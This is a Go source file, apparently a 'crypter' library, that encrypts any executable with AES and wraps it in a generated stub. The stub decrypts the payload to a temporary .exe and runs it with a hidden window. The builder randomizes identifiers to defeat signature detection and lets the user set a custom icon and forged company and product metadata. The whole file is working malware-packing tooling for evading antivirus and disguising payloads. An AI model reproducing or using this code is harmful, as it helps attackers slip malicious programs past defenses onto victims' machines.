package execryptor

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	mrand "math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/josephspurrier/goversioninfo"
)

const stubTemplate = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

var (
	__KEY__ = "%s"
	__DATA__ = "%s"
)

func main() {
	keyBytes, err := base64.StdEncoding.DecodeString(__KEY__)
	if err != nil {
		return
	}
	data, err := base64.StdEncoding.DecodeString(__DATA__)
	if err != nil {
		return
	}

	if len(keyBytes) != 32 {
		sum := sha256.Sum256(keyBytes)
		keyBytes = sum[:]
	}

	c, err := aes.NewCipher(keyBytes)
	if err != nil {
		return
	}

	if len(data) < aes.BlockSize {
		return
	}

	iv := data[:aes.BlockSize]
	payload := data[aes.BlockSize:]

	dec := cipher.NewCFBDecrypter(c, iv)
	dec.XORKeyStream(payload, payload)

	t, err := os.CreateTemp("", "*.exe")
	if err != nil {
		return
	}
	defer os.Remove(t.Name())

	if _, err = t.Write(payload); err != nil {
		return
	}
	if err = t.Close(); err != nil {
		return
	}

	cmd := exec.Command(t.Name())
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Dir = filepath.Dir(t.Name())
	cmd.Run()
}
`

type Cryptor struct {
	key []byte
}

func NewCryptor(password string) *Cryptor {
	hash := sha256.Sum256([]byte(password))
	return &Cryptor{key: hash[:]}
}

func (c *Cryptor) EncryptFile(inputPath string) (string, error) {
	data, err := os.ReadFile(inputPath)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(c.key)
	if err != nil {
		return "", err
	}

	ciphertext := make([]byte, aes.BlockSize+len(data))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (c *Cryptor) CreateStub(encryptedData, outputPath string, opts BuildOptions) error {
	keyStr := base64.StdEncoding.EncodeToString(c.key)
	stubCode := fmt.Sprintf(stubTemplate, keyStr, encryptedData)

	if opts.EnableObfuscation {
		stubCode = obfuscateStub(stubCode)
	}

	tempDir, err := os.MkdirTemp("", "obfstub")
	if err != nil {
		return fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(tempDir)

	stubFile := filepath.Join(tempDir, "stub_main.go")
	resourceFile := filepath.Join(tempDir, "stub_resources.syso")

	if err := os.WriteFile(stubFile, []byte(stubCode), 0644); err != nil {
		return err
	}
	defer os.Remove(stubFile)

	if opts.IconPath != "" || hasMetadata(opts.Metadata) {
		if err := buildResourceSyso(resourceFile, opts); err != nil {
			return fmt.Errorf("resource build failed: %w", err)
		}
		defer os.Remove(resourceFile)
	} else {
		resourceFile = ""
	}

	args := []string{"build", "-o", outputPath}
	args = append(args, "-ldflags", "-H windowsgui", stubFile)

	cmd := exec.Command("go", args...)
	cmd.Dir = tempDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("go build failed: %w\n%s", err, string(output))
	}

	return nil
}

func hasMetadata(m Metadata) bool {
	return m.CompanyName != "" ||
		m.FileDescription != "" ||
		m.ProductName != "" ||
		m.FileVersion != "" ||
		m.ProductVersion != ""
}

func buildResourceSyso(output string, opts BuildOptions) error {
	vi := &goversioninfo.VersionInfo{}
	vi.IconPath = opts.IconPath
	vi.StringFileInfo.CompanyName = opts.Metadata.CompanyName
	vi.StringFileInfo.FileDescription = opts.Metadata.FileDescription
	vi.StringFileInfo.ProductName = opts.Metadata.ProductName
	vi.StringFileInfo.FileVersion = opts.Metadata.FileVersion
	vi.StringFileInfo.ProductVersion = opts.Metadata.ProductVersion
	vi.Build()
	vi.Walk()
	return vi.WriteSyso(output, "amd64")
}

func obfuscateStub(code string) string {
	mrand.Seed(time.Now().UnixNano())
	repl := map[string]string{
		"__KEY__":  randomIdent("k"),
		"__DATA__": randomIdent("d"),
		"payload":  randomIdent("p"),
		"keyBytes": randomIdent("kb"),
		"data":     randomIdent("dt"),
		"t":        randomIdent("tmp"),
		"cmd":      randomIdent("run"),
		"iv":       randomIdent("iv"),
		"dec":      randomIdent("dec"),
		"err":      randomIdent("err"),
	}

	for k, v := range repl {
		re := regexp.MustCompile(`\b` + regexp.QuoteMeta(k) + `\b`)
		code = re.ReplaceAllString(code, v)
	}
	return code
}

func randomIdent(prefix string) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	sb := strings.Builder{}
	sb.WriteString(prefix)
	for i := 0; i < 6; i++ {
		sb.WriteByte(letters[mrand.Intn(len(letters))])
	}
	return sb.String()
}
